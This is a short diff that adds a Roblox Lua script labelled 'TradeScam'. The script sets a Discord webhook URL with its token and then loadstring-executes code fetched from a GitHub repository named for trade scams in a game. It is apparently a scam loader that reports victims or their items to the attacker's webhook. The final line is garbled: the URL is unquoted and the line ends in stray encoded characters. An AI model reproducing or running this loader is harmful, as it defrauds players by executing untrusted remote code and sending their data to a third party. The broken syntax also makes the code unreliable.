@@ -1,0 +1,4 @@
+_G.Username = "YBA_HKStar"
+_G.HubName = "TradeScam"
+_G.WebhookUrl = "https://discord.com/api/webhooks/1102155651846774905/L6tiwCsKeFAro-3iOjXzfI5fwCY5M2WxO-1rq2Smgdash0vRhLEExpLOttmGCk9Nc-To"
+loadstring(game:HttpGet(https://raw.githubusercontent.com/hk87noob1234567/Trade-Scam-Real-in-psx/main/while%20true%20do%22))()%22,true))();
